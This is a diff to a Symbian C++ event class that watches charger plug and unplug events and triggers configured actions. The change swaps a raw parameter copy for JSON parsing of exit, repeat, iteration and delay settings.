@@ -6,6 +6,7 @@
  */
 
 #include "EventAc.h"
+#include "Json.h"
 
 CEventAc::CEventAc(TUint32 aTriggerId) :
 	CAbstractEvent(EEvent_AC, aTriggerId),iBatteryInfoPckg(iBatteryInfo)
@@ -42,8 +43,55 @@ void CEventAc::ConstructL(const TDesC8& params)
 	__FLOG(_L("-------------"));
 	
 	BaseConstructL(params);
-	Mem::Copy(&iAcParams, iParams.Ptr(), sizeof(iAcParams));
 		
+	RBuf paramsBuf;
+		
+	TInt err = paramsBuf.Create(2*params.Size());
+	if(err == KErrNone)
+		{
+		paramsBuf.Copy(params);
+		}
+	else
+		{
+		//TODO: not enough memory
+		}
+		
+	paramsBuf.CleanupClosePushL();
+	CJsonBuilder* jsonBuilder = CJsonBuilder::NewL();
+	CleanupStack::PushL(jsonBuilder);
+	jsonBuilder->BuildFromJsonStringL(paramsBuf);
+	CJsonObject* rootObject;
+	jsonBuilder->GetDocumentObject(rootObject);
+	if(rootObject)
+		{
+		CleanupStack::PushL(rootObject);
+		//retrieve exit action
+		if(rootObject->Find(_L("end")) != KErrNotFound)
+			{
+			rootObject->GetIntL(_L("end"),iAcParams.iExitAction);
+			}
+		else
+			iAcParams.iExitAction = -1;
+			
+		//retrieve repeat action
+		if(rootObject->Find(_L("repeat")) != KErrNotFound)
+			{
+			rootObject->GetIntL(_L("repeat"),iAcParams.iRepeatAction);
+			rootObject->GetIntL(_L("iter"),iAcParams.iIter);
+			rootObject->GetIntL(_L("delay"),iAcParams.iDelay);
+			}
+		else
+			{
+			iAcParams.iRepeatAction = -1;
+			iAcParams.iIter = 0;
+			iAcParams.iDelay = 0;
+			}
+		CleanupStack::PopAndDestroy(rootObject);
+		}
+
+	CleanupStack::PopAndDestroy(jsonBuilder);
+	CleanupStack::PopAndDestroy(&paramsBuf);
+
 	iPhone = CPhone::NewL();
 	iPhone->SetObserver(this);
 	__FLOG(_L("End ConstructL"));
@@ -118,7 +166,7 @@ void CEventAc::HandlePhoneEventL(TPhoneFunctions event)
 			{
 			// Triggers the unplug action
 			iWasConnectedToCharger = EFalse;
-			if (iAcParams.iExitAction != 0xFFFFFFFF)
+			if (iAcParams.iExitAction != -1)
 				{
 				SendActionTriggerToCoreL(iAcParams.iExitAction);
 				}
